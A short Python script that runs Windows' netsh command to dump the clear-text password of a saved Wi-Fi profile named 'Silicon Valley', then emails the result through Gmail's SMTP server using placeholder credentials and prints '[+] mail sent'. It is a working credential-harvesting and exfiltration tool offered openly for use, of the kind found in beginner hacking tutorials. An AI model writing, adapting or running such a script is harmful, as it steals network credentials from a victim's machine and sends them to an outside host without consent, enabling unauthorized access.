#!/usr/bin/env python

import subprocess
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()




command = 'netsh wlan show profile "Silicon Valley" key = clear'

result = subprocess.check_output(command, shell = True).decode()

send_mail("Your mail here","---", result)

print("[+] mail sent")
